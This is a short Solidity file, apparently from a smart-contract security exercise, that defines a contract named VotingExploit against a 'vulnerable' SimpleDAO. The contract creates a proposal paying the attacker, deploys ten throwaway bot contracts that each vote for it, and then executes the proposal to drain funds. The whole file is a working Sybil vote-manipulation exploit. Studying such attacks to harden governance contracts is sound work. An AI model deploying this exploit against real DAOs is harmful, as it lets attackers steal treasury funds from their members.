// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "./interfaces/ISimpleDAO.sol";

/**
 * @title VotingExploit
 * @dev Exploits the vulnerable voting system
 */
contract VotingExploit {
    ISimpleDAO public dao;
    address payable public attacker;

    constructor(address _dao) {
        dao = ISimpleDAO(_dao);
        attacker = payable(msg.sender);
    }

    function attackVoting(uint256 amount) external {
        // Create malicious proposal
        uint256 proposalId = dao.createProposal(attacker, amount, "Malicious proposal");

        // Create multiple voting bots
        for (uint256 i = 0; i < 10; i++) {
            VotingBot bot = new VotingBot(address(dao));
            bot.vote(proposalId);
        }

        // Execute proposal after vote manipulation
        dao.executeProposal(proposalId);
    }

    receive() external payable {}
}

contract VotingBot {
    ISimpleDAO public dao;

    constructor(address _dao) {
        dao = ISimpleDAO(_dao);
    }

    function vote(uint256 proposalId) external {
        dao.vote(proposalId, true);
    }
}
